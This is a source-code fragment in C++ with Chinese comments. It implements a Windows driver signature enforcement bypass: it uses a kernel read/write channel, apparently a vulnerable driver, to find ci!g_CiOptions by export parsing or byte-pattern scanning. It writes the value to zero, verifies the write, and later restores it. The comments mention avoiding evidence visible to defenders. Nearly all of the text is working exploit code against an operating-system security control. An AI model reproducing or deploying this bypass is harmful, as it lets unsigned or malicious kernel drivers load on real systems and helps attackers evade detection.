            for (ULONG index = 0; index < directory.NumberOfNames; ++index)
            {
                ULONG nameRva = 0;
                if (!KernelRead(info.base + directory.AddressOfNames + index * 4, &nameRva, 4))
                    return false;

                char name[24] = {};
                if (!KernelRead(info.base + nameRva, name, sizeof(name) - 1))
                    return false;

                if (strcmp(name, "CiInitialize") != 0)
                    continue;

                USHORT ordinal = 0;
                if (!KernelRead(info.base + directory.AddressOfNameOrdinals + index * 2, &ordinal, 2))
                    return false;

                ULONG functionRva = 0;
                if (!KernelRead(info.base + directory.AddressOfFunctions + ordinal * 4, &functionRva, 4))
                    return false;

                if (functionRva == 0)
                    return false;

                const uintptr_t functionVa = info.base + functionRva;
                BYTE code[64] = {};
                if (!KernelRead(functionVa, code, sizeof(code)))
                    return false;

                for (int offset = 0; offset + 10 <= (int)sizeof(code); ++offset)
                {
                    if (code[offset] != 0xC7 || code[offset + 1] != 0x05)
                        continue;
                    if (code[offset + 6] != 0x06 || code[offset + 7] != 0x00 ||
                        code[offset + 8] != 0x00 || code[offset + 9] != 0x00)
                        continue;

                    const LONG displacement = *(LONG*)(code + offset + 2);
                    const uintptr_t candidate = functionVa + offset + 10 + displacement;
                    if (ValidateCiOptionsCandidate(candidate, info))
                    {
                        *result = candidate;
                        return true;
                    }
                }

                return false;
            }

            return false;
        }

        bool ReadSectionTable(const CiImageInfo& info, std::vector<CiSectionInfo>& sections)
        {
            sections.clear();
            for (USHORT index = 0; index < info.numberOfSections; ++index)
            {
                struct RawSection
                {
                    char  Name[8];
                    ULONG VirtualSize;
                    ULONG VirtualAddress;
                    ULONG SizeOfRawData;
                    ULONG PointerToRawData;
                    ULONG PointerToRelocations;
                    ULONG PointerToLinenumbers;
                    USHORT NumberOfRelocations;
                    USHORT NumberOfLinenumbers;
                    ULONG Characteristics;
                } raw = {};

                if (!KernelRead(info.sectionTable + index * sizeof(raw), &raw, sizeof(raw)))
                    return false;

                CiSectionInfo section = {};
                memcpy(section.name, raw.Name, 8);
                section.name[8] = 0;
                section.virtualAddress = raw.VirtualAddress;
                section.virtualSize = raw.VirtualSize;
                section.characteristics = raw.Characteristics;
                sections.push_back(section);
            }
            return true;
        }

        // 路径 B：扫可执行节里的 `C7 05 disp32 06 00 00 00`
        bool LocateCiOptionsByScan(const CiImageInfo& info, uintptr_t* result)
        {
            constexpr ULONG kSectionExecutable = 0x20000000;
            constexpr size_t kChunkSize = 0x400;
            constexpr size_t kOverlap = 10;
            constexpr size_t kTotalScanLimit = 4 * 1024 * 1024;

            std::vector<CiSectionInfo> sections;
            if (!ReadSectionTable(info, sections))
                return false;

            std::vector<BYTE> chunk(kChunkSize + kOverlap, 0);
            size_t scanned = 0;
            const ULONGLONG began = GetTickCount64();

            for (const CiSectionInfo& section : sections)
            {
                if ((section.characteristics & kSectionExecutable) == 0)
                    continue;

                const ULONG length = section.virtualSize ? section.virtualSize : 0;
                if (length == 0)
                    continue;

                const uintptr_t sectionBase = info.base + section.virtualAddress;

                for (ULONG offset = 0; offset < length && scanned < kTotalScanLimit; offset += (ULONG)kChunkSize)
                {
                    const size_t left = (size_t)(length - offset);
                    const size_t want = left < (kChunkSize + kOverlap) ? left : (kChunkSize + kOverlap);
                    if (!KernelRead(sectionBase + offset, chunk.data(), want))
                        return false;

                    for (size_t index = 0; index + 10 <= want; ++index)
                    {
                        if (chunk[index] != 0xC7 || chunk[index + 1] != 0x05)
                            continue;
                        if (chunk[index + 6] != 0x06 || chunk[index + 7] != 0x00 ||
                            chunk[index + 8] != 0x00 || chunk[index + 9] != 0x00)
                            continue;

                        const LONG displacement = *(LONG*)(chunk.data() + index + 2);
                        const uintptr_t candidate = sectionBase + offset + index + 10 + displacement;
                        if (ValidateCiOptionsCandidate(candidate, info))
                        {
                            *result = candidate;
                            return true;
                        }
                    }

                    scanned += (want > kOverlap) ? (want - kOverlap) : want;
                }
            }

            logger.outDebug(L"[DSE] 扫描未命中（%llu ms / %zu 字节）。",
                (unsigned long long)(GetTickCount64() - began), scanned);
            return false;
        }

        uintptr_t LocateCiOptionsInternal()
        {
            CiImageInfo info = {};
            if (!ParseCiImage(&info))
                return 0;

            uintptr_t candidate = 0;
            if (LocateCiOptionsByExport(info, &candidate))
            {
                logger.outDebug(L"[DSE] 导出表路径命中: ci!g_CiOptions=0x%p", (void*)candidate);
                return candidate;
            }

            logger.outDebug(L"[DSE] 导出表路径未命中，回退可执行节扫描。");
            if (LocateCiOptionsByScan(info, &candidate))
            {
                logger.outDebug(L"[DSE] 扫描路径命中: ci!g_CiOptions=0x%p", (void*)candidate);
                return candidate;
            }

            return 0;
        }
    }

    uintptr_t GetCiOptionsAddress()
    {
        return g_ciOptions;
    }

    // ==================================================================
    //  6. DSE 绕过
    // ==================================================================
    bool BeginDseBypass(const std::wstring& driverDirectory)
    {
        if (g_dsePatched)
            return true;

        if (!OpenKernelAccess(driverDirectory))
            return false;

        const uintptr_t options = LocateCiOptionsInternal();
        if (options == 0)
        {
            logger.outDebug(L"[DSE] 定位 g_CiOptions 失败，放弃绕过。");
            CloseKernelAccess();
            return false;
        }

        // 先备份原始值再改写。原值不一定是 0x6：
        //   * 0xE  —— 开了 HVCI / 内存完整性（Win11 默认可能就是这个）
        //   * 0x0  —— 系统本来就没开 DSE
        // 写死 0x6 还原会把 HVCI 顺手关掉：安全姿态被悄悄改变，
        // 而且对方查 SystemCodeIntegrityInformation 会看到前后不一致，等于自己留证据。
        uint32_t originalOptions = 0;
        if (!KernelRead32(options, &originalOptions))
        {
            logger.outDebug(L"[DSE] 读取 g_CiOptions 原值失败，放弃绕过（不能盲写）。");
            CloseKernelAccess();
            return false;
        }

        if (!KernelWrite32(options, 0))
        {
            logger.outDebug(L"[DSE] 写入 g_CiOptions 失败，放弃绕过。");
            CloseKernelAccess();
            return false;
        }

        uint32_t verify = 0xFF;
        if (!KernelRead32(options, &verify) || verify != 0)
        {
            logger.outDebug(L"[DSE] 回读校验失败 (value=0x%X)，放弃绕过。", verify);
            CloseKernelAccess();
            return false;
        }

        g_ciOptions = options;
        g_originalCiOptions = originalOptions;
        g_originalCiOptionsValid = true;
        g_dsePatched = true;
        logger.outDebug(L"[DSE] 已关闭驱动签名强制: ci!g_CiOptions=0x%p 0x%X -> 0", (void*)options, originalOptions);
        return true;
    }

    void EndDseBypass()
    {
        if (g_dsePatched)
        {
            // 还原必须写回**原始值**，不是写死 0x6：原值可能是 0xE（HVCI 开着）或 0（本来就没开）。
            const uint32_t restoreValue = g_originalCiOptionsValid ? g_originalCiOptions : 0x6;

            if (g_ciOptions != 0 && g_device != INVALID_HANDLE_VALUE &&
                KernelWrite32(g_ciOptions, restoreValue))
            {
                uint32_t verify = 0xFFFFFFFF;
                if (KernelRead32(g_ciOptions, &verify) && verify == restoreValue)
                {
                    logger.outDebug(L"[DSE] 已还原 g_CiOptions=0x%X（原始值）", restoreValue);
                }
                else
                {
                    logger.outDebug(L"[DSE] 还原后回读不一致 (0x%X)，建议重启系统恢复签名强制。", verify);
                }
            }
            else
            {
                // 通道已经关闭 / 漏驱被卸载 / 写失败：此时 DSE 仍处于关闭状态。
                // 必须显式喊出来，否则用户会以为"已经还原"，而整机实际处于可以加载任意驱动的状态。
                logger.outDebug(L"[DSE] 无法还原 g_CiOptions，驱动签名强制仍为关闭状态，重启系统即可恢复。");
            }
        }

        g_dsePatched = false;
        g_ciOptions = 0;
        g_originalCiOptionsValid = false;
        CloseKernelAccess();
    }
}
